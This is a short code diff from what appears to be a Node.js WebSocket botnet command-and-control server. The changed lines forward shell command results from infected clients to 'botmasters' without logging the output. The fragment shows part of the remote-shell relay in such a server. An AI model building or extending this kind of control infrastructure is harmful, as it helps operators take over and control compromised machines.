@@ -122,9 +122,9 @@ wss.on('connection', (ws, req) => {
                     break;
 
                 case "Shell":
-                    console.log('Received shell result from client: ', ip, result.result)
-                    let encoder = new TextEncoder();
-                    botmasters[result.botmaster].send(encoder.encode(result.result))
+                    console.log('Received shell result from client: ', ip)
+
+                    botmasters[result.botmaster].send(result.result)
                     break;
 
                 default:
